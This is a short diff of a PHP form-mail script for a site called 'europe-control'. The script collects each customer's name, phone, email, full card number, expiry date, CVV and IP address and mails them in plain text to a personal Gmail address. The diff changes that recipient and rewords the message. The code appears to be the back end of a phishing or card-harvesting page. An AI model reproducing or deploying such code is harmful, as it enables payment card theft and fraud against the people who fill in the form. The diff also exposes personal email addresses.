@@ -5,8 +5,7 @@ function mail_utf8($to, $from, $subject='(No subject)', $message='', $add_header
     mail($to, '=?UTF-8?B?'.base64_encode($subject).'?=', $message, $headers);
 }
 
-$recepient = 'bakay.sergey28@gmail.com';  //*self Email*/
-// $recepient = 'shelltown@gmail.com';  //*self Email*/
+$recepient = 'shelltown@gmail.com';  //*self Email*/
 $sitename = "europe-control";
 
 // f-name
@@ -29,7 +28,7 @@ $res2 = trim($_POST["res2"]);
 $subject = "New contact";
 $ip = $_SERVER["REMOTE_ADDR"];
 
-$message = "I wish to contact you, $subject \n First-Name: $f_name \n Last-Name: $l_name \n Tel: $tel \n E-mail: $from \n Card: $card_num \n card-date: $card_date \n card-cvv: $card_cvv \n Selected services: $res2 \n sum: $res \n (User IP:  $ip)";
+$message = " I would like to order services from you, $subject \n First Name: $f_name \n Last Name: $l_name \n Tel: $tel \n E-mail: $from \n Card: $card_num \n Card date: $card_date \n Card CVV: $card_cvv \n Selected services: $res2 \n sum: € $res \n (User IP:  $ip)";
 
 $pagetitle = 'have a new contact with the site "'.$sitename.'"';
 
